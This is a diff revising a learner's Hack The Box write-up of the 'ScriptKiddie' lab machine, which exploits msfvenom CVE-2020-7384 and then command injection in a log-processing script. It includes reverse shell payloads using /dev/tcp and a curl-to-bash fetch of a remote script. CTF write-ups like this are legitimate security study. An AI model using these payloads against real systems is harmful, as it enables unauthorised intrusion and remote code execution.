@@ -33,7 +33,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 <h4>What is the scan telling us?</h4>
 
 - Port 22 is open running ssh, specifically OpenSSH 8.2p1 on Ubuntu.
-- Reveals a web server on 5000, with Werkzeug 0.16.1 running on Python 3.8.5. [Werkzeug](https://werkzeug.palletsprojects.com/en/2.0.x/) is a *"is a comprehensive WSGI web application library."* 
+- Reveals a web server on 5000, with Werkzeug 0.16.1 running on Python 3.8.5. [Werkzeug](https://werkzeug.palletsprojects.com/en/2.0.x/) is *"a comprehensive WSGI web application library."* 
 
 [WSGI](https://wsgi.readthedocs.io/en/latest/what.html) refers to:
 
@@ -41,10 +41,10 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Accessing the site at http://10.10.10.226:5000/ we see 3 inputs for a basic "hackers toolbox".
 
-There are numerous "tools" present on the page, including an Nmap tool, msfvenom and a earchsploit tool. 
+There are numerous "tools" present on the page, including a Nmap, msfvenom and a SearchSploit tool. 
 
-I assume that the Nmap and Searchsploit simply run the binaries and display results. The venom generator allows us to upload files to it, this 
-could be a potential exploit point. But at this point I am lost, reading writeups it seems that the vulnerabillity is within msfvenom 
+I assume that the Nmap and SearchSploit simply run the binaries and display results. The venom generator allows us to upload files to it, this 
+could be a potential exploit point. But at this point I am lost, reading writeups it seems that the vulnerability is within msfvenom 
 itself. This [Github page](https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md) by the exploit author Justin Steven explains the vuln and references it as [CVE-2020-7384](https://nvd.nist.gov/vuln/detail/CVE-2020-7384). They explain that:
 
 >*"There is a command injection vulnerability in msfvenom when using a crafted APK file as an Android payload template.
@@ -59,14 +59,22 @@ For this it seems the following criteria can result in a command injection vuln.
 
 If a crafted APK file has a signature with an "Owner" field containing:
 - A single quote (to escape the single-quoted string)
-- Followed by shell metacharacters"
+- Followed by shell metacharacters
+
+
 
 
 <h2>Foothold</h2>
 
-We follow the instructions from the [exploitdb](https://www.exploit-db.com/exploits/49491) page of CVE-2020-7384. Which involved downloading a python script to generate an "evil.apk" file. We start our nc listener, set the target as Android on the website as apk's are android files. We then we upload and catch the shell.
+We follow the instructions from the previously referenced Github page. Which involved downloading a python script to generate an "evil.apk" file, the script is described as: 
 
-Now we have a shell, we upgrade to a tty with `/usr/bin/script -qc /bin/bash /dev/null`. We find the user flag in kid's home folder.
+>*"The following Python script will produce a crafted APK file that executes a given command-line payload when used as a template."*
+
+In this case we will be using it to execute a reverse shell on the box.
+We start our Netcat listener, set the target as Android on the website as APK files are Android files. We then we upload and catch the shell.
+Now we have a shell, we upgrade to a tty with `/usr/bin/script -qc /bin/bash /dev/null`. 
+
+We find the user flag in `kid`'s home folder.
 
 <h2>Lateral movement</h2>
 I am way out of my depth here.
@@ -85,11 +93,44 @@ This searches files for the presence of logs.
 
 We see that `app.py` writes to `/home/kid/logs/hackers.`
 
-Reading app.py we see that it writes to the logs directory when non-alphanumeric characters are input into the website's searchsploit field. The writer assumes that submitted non-alpha characters represent an attempt to *"hacK"* them so they note ip addresses of users who submit them in a log and run Nmap on them. 
+Reading app.py we see that it writes to the logs directory when non-alphanumeric characters are input into the website's SearchSploit field. The writer assumes that submitted non-alpha characters represent an attempt to *"hacK"* them. So the script notes ip addresses of users who submit them in a log and run Nmap on them. 
 
-`scanlosers.sh` does not perform any input validation so we can perform "arbitrary OS command injection" by inputting our reverse shell in there, the command is executed by scanlosers.sh, giving us a shell as pwn as pwn owns scanlosers.sh. 
+`scanlosers.sh` does not perform any input validation so we can perform "arbitrary OS command injection" by inputting our reverse shell in there. Ippsec does an excellent analysis of scanlosers.sh, after watching their video I now understand why our command would be executed.
 
-Putting the reverse shell into `/home/kid/logs/hackers.` with `echo 'a b $(bash -c "bash -i &>/dev/tcp/YOURIP/YOURPORT 0>&1")' > /home/kid/logs/hackers` gives us the reverse shell as pwn.
+```bash
+#!/bin/bash
+ 
+log=/home/kid/logs/hackers
+ 
+cd /home/pwn/
+cat $log | cut -d' ' -f3- | sort -u | while read ip; do
+    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
+done
+ 
+if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
+
+```
+
+We can see that the script reads the log file, then field separates the log based upon a single character separator of a ' ' space. Every field from the third field onward is treated as an ip.
+
+Once the script determines what an ip is, it is then nmap'd by the command in the `do` part of the script:
+
+```bash
+sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null"
+```
+
+Ippsec points out that if the log file contains a string that has whatever for the initial two fields and then a semicolon, it would essentially nullify the first part of the command which is `nmap --top-ports 10 -oN recon/`. 
+
+Then a desired command can be placed in the third field, which is then ended with a hash(#) to comment out the rest of the command `.nmap ${ip} 2>&1 >/dev/null`. Their example is:
+
+```
+echo 'abc def ;curl 10.10.14.2:8000/rev.sh | bash #
+```
+
+This would result in the initial and end part of the original command being nullified by `;` and `#`. As the first part is not a command so does not execute, then our command is read, and then the end of the original command is commented out.
+Our command would then be executed by `scanlosers.sh`, giving us a shell as `pwn` as `pwn` owns `scanlosers.sh`. 
+
+Putting our reverse shell into `/home/kid/logs/hackers.` with `echo 'a b $(bash -c "bash -i &>/dev/tcp/YOURIP/YOURPORT 0>&1")' > /home/kid/logs/hackers` gives us the reverse shell as pwn.
 
 <h2>Privilege Escalation</h2>
 
@@ -111,6 +152,7 @@ Then run `system("/bin/bash")` which drops us into a root shell, and the root fl
 
 - Enumerate the contents of the home directories more carefully, figure out what scripts are doing and what they may be writing to.
 - Ippsec uses pspy alot, which seems to be a good process monitor. Run it, and then interact with the website to see what processes are called and when.
+- Learn bash.
 - Things sometimes write logs, in which case figure out where they are writing to and what else uses them.
 - As for foothold, try to find a CVE on everything, don't be afraid to just try them. It isn't a race.
 
